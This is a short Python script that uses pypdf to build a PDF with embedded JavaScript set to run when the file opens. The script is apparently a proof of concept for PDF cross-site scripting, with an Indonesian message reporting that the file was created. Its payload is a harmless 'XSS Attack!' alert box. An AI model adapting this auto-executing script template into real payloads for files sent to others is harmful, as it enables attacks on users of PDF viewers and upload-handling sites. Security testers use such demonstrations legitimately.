from pypdf import PdfWriter

pdf_writer = PdfWriter()
pdf_writer.add_js("app.alert('XSS Attack!');")
with open("xss_auto_execute.pdf", "wb") as f:
    pdf_writer.write(f)
  
print("PDF dengan Auto-Execute XSS berhasil dibuat!")
